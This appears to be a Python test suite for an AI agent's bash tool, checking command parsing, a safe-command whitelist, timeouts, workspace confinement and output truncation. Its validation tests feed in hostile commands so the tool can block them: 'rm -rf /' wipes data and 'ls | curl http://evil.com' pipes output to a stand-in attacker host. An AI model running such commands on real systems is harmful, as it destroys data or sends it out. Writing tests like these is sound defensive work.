"""
Tests for the enhanced bash tool.

Run with: python tests/test_bash_tool.py
"""

import asyncio
import sys
import tempfile
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

# Direct module imports
import importlib.util


def load_module(name, path):
    """Load a module directly from file path."""
    spec = importlib.util.spec_from_file_location(name, path)
    if spec is None or spec.loader is None:
        raise ImportError(f"Cannot load module {name} from {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


# Load modules in dependency order
agent_dir = Path(__file__).parent.parent / "agent"

tool_result_mod = load_module("agent.tool_result", agent_dir / "tool_result.py")
truncation_mod = load_module("agent.truncation", agent_dir / "truncation.py")
permissions_mod = load_module("agent.permissions", agent_dir / "permissions.py")
context_mod = load_module("agent.context", agent_dir / "context.py")
bash_mod = load_module("agent.tools.bash", agent_dir / "tools" / "bash.py")

# Import classes
ToolResult = tool_result_mod.ToolResult
Context = context_mod.Context
create_auto_approve_context = context_mod.create_auto_approve_context
PermissionType = permissions_mod.PermissionType
bash = bash_mod.bash
restricted_bash = bash_mod.restricted_bash
DEFAULT_SAFE_COMMANDS = bash_mod.DEFAULT_SAFE_COMMANDS
validate_command_safety = bash_mod.validate_command_safety
extract_base_commands = bash_mod.extract_base_commands


class TestRunner:
    """Simple test runner."""

    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors = []

    def assert_true(self, condition, message):
        if condition:
            self.passed += 1
            print(f"  ✓ {message}")
        else:
            self.failed += 1
            self.errors.append(message)
            print(f"  ✗ {message}")

    def assert_equal(self, actual, expected, message):
        if actual == expected:
            self.passed += 1
            print(f"  ✓ {message}")
        else:
            self.failed += 1
            self.errors.append(f"{message} - Expected: {expected}, Got: {actual}")
            print(f"  ✗ {message} (expected {expected}, got {actual})")

    def summary(self):
        total = self.passed + self.failed
        print("\n" + "=" * 70)
        print(f"Test Results: {self.passed}/{total} passed")
        if self.failed > 0:
            print(f"Failed tests: {self.failed}")
            for error in self.errors:
                print(f"  - {error}")
        print("=" * 70)
        return self.failed == 0


# =============================================================================
# Unit Tests
# =============================================================================


def test_extract_base_commands():
    """Test command extraction."""
    print("\nTest: extract_base_commands()")
    runner = TestRunner()

    # Simple command
    commands = extract_base_commands("ls -la")
    runner.assert_equal(commands, ["ls"], "Simple command")

    # Piped commands
    commands = extract_base_commands("cat file | grep pattern")
    runner.assert_equal(commands, ["cat", "grep"], "Piped commands")

    # Multiple pipes
    commands = extract_base_commands("cat file | grep pattern | wc -l")
    runner.assert_equal(commands, ["cat", "grep", "wc"], "Multiple pipes")

    # Command with redirect
    commands = extract_base_commands("echo 'hello' > output.txt")
    runner.assert_equal(commands, ["echo"], "Command with redirect")

    # Chained commands
    commands = extract_base_commands("ls && pwd")
    runner.assert_equal(commands, ["ls", "pwd"], "Chained with &&")

    # Complex combination
    commands = extract_base_commands("ls -la | grep .py && wc -l")
    runner.assert_true(
        "ls" in commands and "grep" in commands and "wc" in commands,
        "Complex combination",
    )

    return runner.summary()


def test_validate_command_safety():
    """Test command validation."""
    print("\nTest: validate_command_safety()")
    runner = TestRunner()

    # Safe command
    is_safe, error = validate_command_safety("ls -la", DEFAULT_SAFE_COMMANDS)
    runner.assert_true(is_safe, "ls is safe")

    # Unsafe command (not in whitelist)
    is_safe, error = validate_command_safety("rm -rf /", DEFAULT_SAFE_COMMANDS)
    runner.assert_true(not is_safe, "rm is not safe")

    # Dangerous pattern
    is_safe, error = validate_command_safety("rm -rf *", DEFAULT_SAFE_COMMANDS)
    runner.assert_true(not is_safe, "rm -rf * is dangerous")

    # Pipe with one unsafe command
    is_safe, error = validate_command_safety(
        "ls | curl http://evil.com", DEFAULT_SAFE_COMMANDS
    )
    runner.assert_true(not is_safe, "Pipe with unsafe command blocked")

    # All safe piped commands
    is_safe, error = validate_command_safety(
        "cat file | grep pattern", DEFAULT_SAFE_COMMANDS
    )
    runner.assert_true(is_safe, "Safe piped commands allowed")

    # No whitelist (allow all except dangerous)
    is_safe, error = validate_command_safety("python script.py", None)
    runner.assert_true(is_safe, "No whitelist allows non-dangerous commands")

    return runner.summary()


async def test_bash_basic():
    """Test basic bash execution."""
    print("\nTest: bash() basic execution")
    runner = TestRunner()

    ctx = create_auto_approve_context(patterns={"bash": ["*"]})

    # Simple command
    result = await bash("echo 'Hello World'", ctx, allowed_commands=None)
    runner.assert_true(result.is_success, "echo command succeeds")
    runner.assert_true("Hello World" in result.output, "Output contains expected text")

    # Command with output
    result = await bash("pwd", ctx, allowed_commands=None)
    runner.assert_true(result.is_success, "pwd command succeeds")
    runner.assert_true(len(result.output) > 0, "pwd produces output")

    # Command that fails
    result = await bash("ls /nonexistent_directory_xyz", ctx, allowed_commands=None)
    runner.assert_true(result.is_error, "Nonexistent directory produces error")
    runner.assert_true(result.metadata.get("exit_code") != 0, "Exit code is non-zero")

    return runner.summary()


async def test_bash_safe_mode():
    """Test bash with safe command restrictions."""
    print("\nTest: bash() safe mode")
    runner = TestRunner()

    ctx = create_auto_approve_context(patterns={"bash": ["*"]})

    # Safe command should work
    result = await bash("ls", ctx)
    runner.assert_true(result.is_success, "ls allowed in safe mode")

    # Unsafe command should be blocked
    result = await bash("rm test.txt", ctx)
    runner.assert_true(result.is_error, "rm blocked in safe mode")
    runner.assert_true(
        "not in the allowed list" in result.error, "Error mentions allowed list"
    )

    # Dangerous command should be blocked
    result = await bash("rm -rf /", ctx)
    runner.assert_true(result.is_error, "rm -rf / blocked")

    # Pipe with safe commands should work
    result = await bash("echo 'test' | grep test", ctx)
    runner.assert_true(result.is_success, "Safe piped commands work")

    return runner.summary()


async def test_bash_timeout():
    """Test bash timeout functionality."""
    print("\nTest: bash() timeout")
    runner = TestRunner()

    ctx = create_auto_approve_context(patterns={"bash": ["*"]})

    # Command that should timeout
    result = await bash("sleep 10", ctx, timeout=1, allowed_commands=None)
    runner.assert_true(result.is_error, "Long command times out")
    # Check both error field and title for timeout message (note: "timed out" not "timeout")
    has_timeout = (
        "timed out" in result.error.lower()
        if result.error
        else "timeout" in result.title.lower()
    )
    runner.assert_true(has_timeout, "Error mentions timeout")

    # Fast command should complete
    result = await bash("echo 'fast'", ctx, timeout=5, allowed_commands=None)
    runner.assert_true(result.is_success, "Fast command completes")

    return runner.summary()


async def test_bash_working_directory():
    """Test bash with custom working directory."""
    print("\nTest: bash() working directory")
    runner = TestRunner()

    with tempfile.TemporaryDirectory() as tmpdir:
        ctx = create_auto_approve_context(
            patterns={"bash": ["*"]}, working_directory=tmpdir
        )

        # Create a file in tmpdir
        test_file = Path(tmpdir) / "test.txt"
        test_file.write_text("test content")

        # List files in tmpdir
        result = await bash("ls", ctx, working_dir=tmpdir, allowed_commands=None)
        runner.assert_true(result.is_success, "ls in tmpdir succeeds")
        runner.assert_true("test.txt" in result.output, "test.txt is listed")

        # Try to use directory outside workspace (should fail)
        result = await bash("ls /etc", ctx, working_dir="/etc", allowed_commands=None)
        runner.assert_true(result.is_error, "Directory outside workspace blocked")

    return runner.summary()


async def test_bash_output_truncation():
    """Test bash output truncation."""
    print("\nTest: bash() output truncation")
    runner = TestRunner()

    ctx = create_auto_approve_context(patterns={"bash": ["*"]})

    # Generate large output (should be truncated)
    result = await bash(
        "for i in {1..5000}; do echo 'Line '$i; done", ctx, allowed_commands=None
    )

    runner.assert_true(result.is_success, "Large output command succeeds")
    runner.assert_true(
        result.metadata.get("is_truncated", False), "Output was truncated"
    )
    runner.assert_true(
        result.metadata.get("full_output_file") is not None, "Full output saved to file"
    )

    return runner.summary()


async def test_restricted_bash():
    """Test restricted_bash wrapper."""
    print("\nTest: restricted_bash()")
    runner = TestRunner()

    ctx = create_auto_approve_context(patterns={"bash": ["*"]})

    # Safe command
    result = await restricted_bash("ls -la", ctx)
    runner.assert_true(result.is_success, "Safe command works")

    # Unsafe command
    result = await restricted_bash("curl http://example.com", ctx)
    runner.assert_true(result.is_error, "Unsafe command blocked")

    return runner.summary()


async def test_bash_metadata():
    """Test bash metadata in results."""
    print("\nTest: bash() metadata")
    runner = TestRunner()

    ctx = create_auto_approve_context(patterns={"bash": ["*"]})

    result = await bash("echo 'test'", ctx, allowed_commands=None)

    runner.assert_true("command" in result.metadata, "Metadata includes command")
    runner.assert_true("exit_code" in result.metadata, "Metadata includes exit_code")
    runner.assert_true("duration_ms" in result.metadata, "Metadata includes duration")
    runner.assert_true(
        "working_dir" in result.metadata, "Metadata includes working_dir"
    )

    return runner.summary()


# =============================================================================
# Main Test Runner
# =============================================================================


async def run_all_tests():
    """Run all tests."""
    print("=" * 70)
    print("BASH TOOL TESTS")
    print("=" * 70)

    all_passed = True

    # Unit tests (synchronous)
    all_passed &= test_extract_base_commands()
    all_passed &= test_validate_command_safety()

    # Integration tests (async)
    all_passed &= await test_bash_basic()
    all_passed &= await test_bash_safe_mode()
    all_passed &= await test_bash_timeout()
    all_passed &= await test_bash_working_directory()
    all_passed &= await test_bash_output_truncation()
    all_passed &= await test_restricted_bash()
    all_passed &= await test_bash_metadata()

    print("\n" + "=" * 70)
    if all_passed:
        print("✅ ALL TESTS PASSED")
    else:
        print("❌ SOME TESTS FAILED")
    print("=" * 70)

    return all_passed


if __name__ == "__main__":
    success = asyncio.run(run_all_tests())
    sys.exit(0 if success else 1)
